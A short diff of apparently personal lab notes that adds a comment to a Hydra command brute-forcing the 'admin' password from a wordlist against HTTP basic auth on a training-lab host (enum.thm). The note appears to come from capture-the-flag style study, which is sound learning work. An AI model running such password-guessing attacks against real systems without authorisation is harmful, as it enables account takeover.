@@ -1,3 +1,3 @@
 file:///root/Hydra-Password-Cracking-Cheatsheet.pdf
-hydra -l admin -P pass.txt http-get://enum.thm/labs/basic_auth/:A=BASIC -vV
+hydra -l admin -P pass.txt http-get://enum.thm/labs/basic_auth/:A=BASIC -vV (This can be used to run hydra and crack passwords as used in burp suite)
 
